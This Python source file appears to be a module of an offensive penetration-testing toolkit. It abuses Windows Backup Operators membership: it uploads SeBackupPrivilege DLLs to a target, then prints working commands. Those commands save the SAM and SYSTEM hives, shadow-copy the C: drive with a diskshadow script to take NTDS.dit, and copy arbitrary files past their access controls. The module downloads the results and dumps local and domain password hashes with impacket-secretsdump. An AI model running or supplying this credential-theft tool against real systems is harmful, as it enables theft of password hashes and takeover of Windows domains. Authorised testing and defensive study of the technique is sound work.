from pathlib import Path

from core.paths import get_tools_dir
from modules.upload.windows import stage_windows_files, DEFAULT_REMOTE_DIR
from modules.download.windows import receive_windows_file


G, C, B, Y, W, R = (
        '\033[92m',
        '\033[96m',
        '\033[94m',
        '\033[93m',
        '\033[0m',
        '\033[91m',
)

DIM = '\033[2m'

BACKUP_DIR = get_tools_dir() / "backup"

DLLS = ["SeBackupPrivilegeUtils.dll", "SeBackupPrivilegeCmdLets.dll"]

TARGETS = {
    "sam": "SAM / SYSTEM (local hashes)",
    "ntds": "NTDS.dit (domain hashes, DC only)",
    "file": "Arbitrary file (ACL bypass)",
}


# ==========================================
# HELPERS
# ==========================================

def _header(target_label):

    print(f"\n{B}┌── MODULE: BACKUP OPERATORS " + "─" * 31 + f"┐{W}")
    print(f"{B}│{W} TARGET: {C}{target_label:<50}{W}{B}│{W}")
    print(f"{B}└" + "─" * 59 + f"┘{W}")


def _section(title):
    print(f"\n{B}[*] {title}{W}")


def _step(n, title, why=None):

    print(f"\n{B}[{n}]{W} {title}")

    if why:
        print(f"    {why}")


def _cmd(*lines):

    print()

    for line in lines:

        if line.startswith("#"):
            print(f"    {DIM}{line}{W}")
        elif "#" in line:
            code, comment = line.split("#", 1)
            print(f"    {Y}{code.rstrip()}{W}  {DIM}#{comment}{W}")
        else:
            print(f"    {Y}{line}{W}")


def _ask(prompt):
    return input(f"\n{B}[?]{W} {prompt}").strip().lower() in ("", "y", "yes")


# ==========================================
# SETUP (this script does this for you)
# ==========================================

def _stage_dlls():

    binaries = [BACKUP_DIR / name for name in DLLS if (BACKUP_DIR / name).is_file()]

    if not binaries:
        print(f"{R}[!] No local SeBackupPrivilege DLLs found in {BACKUP_DIR} — obtain them manually.{W}")
        return

    if _ask(f"Transfer {', '.join(p.name for p in binaries)} to target? [Y/n]: "):
        stage_windows_files(binaries)


# ==========================================
# ON TARGET (numbered — run these yourself)
# ==========================================

def _enable_privilege(n):

    _step(
        n,
        "Enable SeBackupPrivilege",
        "Membership alone doesn't turn it on — the token still shows it Disabled until enabled explicitly.",
    )

    _cmd(
        f"Import-Module {DEFAULT_REMOTE_DIR}\\SeBackupPrivilegeUtils.dll",
        f"Import-Module {DEFAULT_REMOTE_DIR}\\SeBackupPrivilegeCmdLets.dll",
        "Get-SeBackupPrivilege          # confirm current state",
        "Set-SeBackupPrivilege          # only if it still shows Disabled",
        "whoami /priv                   # confirm it now shows Enabled",
    )

    print()
    print(f"    {B}[*]{W} An explicit Deny ACE on a file/folder still blocks access even with this privilege.")


def _target_sam():

    _enable_privilege(1)

    _step(2, "Back up the SAM and SYSTEM hives")
    _cmd(
        "reg save HKLM\\SAM SAM.SAV",
        "reg save HKLM\\SYSTEM SYSTEM.SAV",
    )

    _step(3, "Pull the hives back and extract the hashes offline")

    if _ask("Download SAM.SAV and SYSTEM.SAV now? [Y/n]: "):
        receive_windows_file(outfile=Path("SAM.SAV"))
        receive_windows_file(outfile=Path("SYSTEM.SAV"))

    _cmd("impacket-secretsdump -sam SAM.SAV -system SYSTEM.SAV LOCAL")


def _target_ntds():

    _enable_privilege(1)

    _step(
        2,
        "Shadow-copy C: and expose it as E:",
        "ntds.dit is locked on the live volume — a shadow copy sidesteps that.",
    )

    print(f"\n    Run {Y}diskshadow.exe{W}, then paste this script into the DISKSHADOW> prompt:")
    _cmd(
        "set verbose on",
        "set metadata C:\\Windows\\Temp\\meta.cab",
        "set context clientaccessible",
        "set context persistent",
        "begin backup",
        "add volume C: alias cdrive",
        "create",
        "expose %cdrive% E:",
        "end backup",
        "exit",
    )

    _step(3, "Copy ntds.dit off the shadow copy, and back up the SYSTEM hive")
    _cmd(
        "Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit .\\ntds.dit",
        "# or: robocopy /b E:\\Windows\\NTDS . ntds.dit",
        "reg save HKLM\\SYSTEM SYSTEM.SAV",
    )

    _step(4, "Pull both files back and extract every domain hash offline")

    if _ask("Download ntds.dit and SYSTEM.SAV now? [Y/n]: "):
        receive_windows_file(outfile=Path("ntds.dit"))
        receive_windows_file(outfile=Path("SYSTEM.SAV"))

    _cmd("impacket-secretsdump -ntds ntds.dit -system SYSTEM.SAV LOCAL")


def _target_file():

    _enable_privilege(1)

    path = input(f"\n{B}[?]{W} Remote file path to read (e.g. C:\\Confidential\\file.txt): ").strip()

    if not path:
        print(f"{R}[-] No path given.{W}")
        return

    local_name = Path(path).name

    _step(2, "Copy the protected file, bypassing its ACL")
    _cmd(f"Copy-FileSeBackupPrivilege '{path}' .\\{local_name}")

    _step(3, "Pull it back")

    if _ask(f"Download {local_name} now? [Y/n]: "):
        receive_windows_file(outfile=Path(local_name))


# ==========================================
# PUBLIC API
# ==========================================

def run(data, cred, args):

    target = None

    if hasattr(args, "extra") and args.extra:
        candidate = args.extra[0].lower()
        if candidate in TARGETS:
            target = candidate

    if target is None:

        print(f"\n{B}[*] Choose a target{W}")

        keys = list(TARGETS.keys())

        for i, key in enumerate(keys, start=1):
            print(f"  {C}[{i}]{W} {TARGETS[key]}")

        raw = input(f"\n{B}[?]{W} Pick a target [1-{len(keys)}]: ").strip()

        target = keys[int(raw) - 1] if raw.isdigit() and 1 <= int(raw) <= len(keys) else None

    if not target:
        print(f"{R}[-] No target selected.{W}")
        return

    _header(TARGETS[target])

    _section("Setup")
    _stage_dlls()

    _section("Execute on target")

    if target == "sam":
        _target_sam()
    elif target == "ntds":
        _target_ntds()
    elif target == "file":
        _target_file()
